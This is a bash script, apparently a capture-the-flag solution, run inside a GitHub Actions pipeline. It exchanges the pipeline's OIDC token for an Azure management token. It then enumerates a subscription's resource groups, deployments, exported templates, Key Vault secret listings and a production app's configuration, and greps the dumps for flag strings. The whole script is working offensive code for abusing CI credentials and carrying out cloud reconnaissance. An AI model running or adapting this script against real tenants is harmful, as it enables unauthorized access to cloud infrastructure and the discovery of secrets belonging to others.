#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
MGMT="https://management.azure.com"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
PMG=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
echo "pipeline mgmt token len=${#PMG}"
H=(-H "Authorization: Bearer $PMG")
DIR=/tmp/arm; mkdir -p "$DIR"; n=0
get () { n=$((n+1)); local f="$DIR/$(printf '%03d' $n)_$1"; shift; curl -sS $M "${H[@]}" "$@" -o "$f" 2>/dev/null; local h; h=$(grep -aoE "DF26\{[^}]*\}" "$f"|sort -u); local e; e=$(jq -r '.error.code // empty' "$f" 2>/dev/null); echo "  $(basename "$f"): ${e:+ERR:$e}${h:+ <<<FLAG:$h}"; [ -n "$h" ] && grep -ao ".\{0,120\}DF26{[^}]*}" "$f"|head; }

echo "=== subscription + RG + resource tags ==="
get sub.json "$MGMT/subscriptions/$SUB?api-version=2020-01-01"
get rgs.json "$MGMT/subscriptions/$SUB/resourcegroups?api-version=2021-04-01"
get resources_tags.json "$MGMT/subscriptions/$SUB/resources?api-version=2021-04-01&\$expand=tags,createdTime,changedTime"

echo "=== deployments (both RGs + subscription) ==="
for RG in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
  get "dep_list_$RG.json" "$MGMT/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Resources/deployments?api-version=2021-04-01"
  for dn in $(jq -r '.value[]?.name' "$DIR/"*"dep_list_$RG.json" 2>/dev/null); do
    get "dep_${RG}_${dn}.json" "$MGMT/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Resources/deployments/$dn?api-version=2021-04-01"
    get "dep_${RG}_${dn}_tmpl.json" -X POST "$MGMT/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Resources/deployments/$dn/exportTemplate?api-version=2021-04-01" -H "Content-Length: 0"
  done
done
get dep_sub_list.json "$MGMT/subscriptions/$SUB/providers/Microsoft.Resources/deployments?api-version=2021-04-01"
for dn in $(jq -r '.value[]?.name' "$DIR/"*dep_sub_list.json 2>/dev/null); do
  get "dep_sub_${dn}.json" "$MGMT/subscriptions/$SUB/providers/Microsoft.Resources/deployments/$dn?api-version=2021-04-01"
done

echo "=== key vault mgmt props + ARM secret-name listing (metadata only) ==="
for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  RGV=rg-tbl-platform-prod-sea
  get "kv_${V}.json" "$MGMT/subscriptions/$SUB/resourceGroups/$RGV/providers/Microsoft.KeyVault/vaults/$V?api-version=2023-07-01"
  get "kv_${V}_secrets.json" "$MGMT/subscriptions/$SUB/resourceGroups/$RGV/providers/Microsoft.KeyVault/vaults/$V/secrets?api-version=2023-07-01"
done

echo "=== reporting app full config/settings via Reader (metadata) ==="
get storefront.json "$MGMT/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01"

echo "===== FINAL DF26 across all ARM dumps ====="
grep -raoE "DF26\{[^}]*\}" "$DIR" 2>/dev/null | sort -u || echo "(none)"
echo "===== all non-empty tags seen ====="
grep -rao '"tags":{[^}]*}' "$DIR" 2>/dev/null | grep -v '"tags":{}' | sort -u | head -40
echo "ARM DONE"; exit 0
